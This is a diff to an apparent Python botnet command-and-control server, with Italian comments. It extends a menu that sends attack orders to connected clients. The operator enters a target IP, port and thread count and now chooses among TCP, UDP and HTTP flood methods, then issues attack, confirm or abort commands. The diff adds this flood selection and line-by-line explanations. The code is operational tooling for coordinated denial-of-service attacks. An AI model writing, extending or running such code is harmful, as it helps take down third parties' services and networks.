@@ -108,43 +108,61 @@ def clear():
 
 # Funzione principale del server
 def main():
-    while True:
+    while True:  # Loop infinito per consentire all'utente di interagire con il menu più volte
         print("\nMenu:")
         print("1. Avvia server")
         print("2. Ferma server")
         print("3. Invia messaggio ai client")
         print("4. Esci")
 
-        choice = input("Seleziona un'opzione: ")
+        choice = input("Seleziona un'opzione: ")  # L'utente seleziona un'opzione
 
-        clear()
-        if choice == '1':
-            start_server("10.0.0.100", 20000, 10)
-        elif choice == '2':
-            stop_server()
-        elif choice == '3':
-            while True:
+        clear()  # Funzione per pulire lo schermo, non definita in questo codice
+
+        if choice == '1':  # Se l'utente sceglie di avviare il server
+            start_server("10.0.0.100", 20000, 10)  # Avvia il server con indirizzo IP, porta e numero massimo di connessioni specificati
+        elif choice == '2':  # Se l'utente sceglie di fermare il server
+            stop_server()  # Ferma il server
+        elif choice == '3':  # Se l'utente sceglie di inviare un messaggio ai client
+            while True:  # Loop per garantire la scelta corretta del tipo di messaggio
                 message = ""
-                message_type = input("Tipo di messaggio (attacco o stop): ")
-                clear()
-                if message_type == "attacco":
-                    ip = input("IP da attaccare: ")
-                    porta = input("Porta da attaccare: ")
-                    threads = input("Numero di thread: ")
-                    message = f"attack {ip} {porta} {threads}"
-                    send_message_to_clients(message)
-                    break
-                elif message_type == "stop":
-                    message = "stop"
-                    send_message_to_clients(message)
-                    break
+                message_type = input("1) attacco \n2) conferma\n 3) abort\n> ")  # L'utente specifica il tipo di messaggio
+                clear()  # Pulisce lo schermo
+
+                if message_type == "1":  # Se l'utente sceglie di inviare un messaggio di attacco
+                    ip = input("IP da attaccare: ")  # L'utente specifica l'IP di destinazione
+                    porta = input("Porta da attaccare: ")  # L'utente specifica la porta di destinazione
+                    threads = input("Numero di thread: ")  # L'utente specifica il numero di thread
+                    method = ""
+                    while True:
+                        method = input("1) TCP FLOOD\n 2) UDP FLOOD\n 3) HTTP FLOOD\n> ")
+                        if method == "1":
+                            method = "TCP_FLOOD"
+                            break
+                        elif method == "2":
+                            method = "UDP_FLOOD"
+                            break
+                        elif method == "3":
+                            method = "HTTP_FLOOD"
+                            break
+                        else:
+                            print("Metodo non valido.")
+                    message = f"attack {ip} {porta} {threads} {method}"  # Costruisce il messaggio di attacco
+                    send_message_to_clients(message)  # Invia il messaggio ai client
+                    break  # Esce dal loop interno
+                elif message_type == "3":  # Se l'utente sceglie di inviare un messaggio di stop
+                    send_message_to_clients("abort")  # Invia il messaggio ai client
+                    break  # Esce dal loop interno
+                elif message_type == "2":
+                    send_message_to_clients("confirm")
                 else:
-                    print("Tipo di messaggio non valido.")
-        elif choice == '4':
-            stop_server()
-            break
+                    print("Tipo di messaggio non valido.")  # Se l'utente inserisce un tipo di messaggio non valido
+
+        elif choice == '4':  # Se l'utente sceglie di uscire dal programma
+            stop_server()  # Ferma il server
+            break  # Esce dal ciclo infinito
         else:
-            print("Opzione non valida.")
+            print("Opzione non valida.")  # Se l'utente inserisce un'opzione non valida
 
 # Variabili globali
 server_running = False
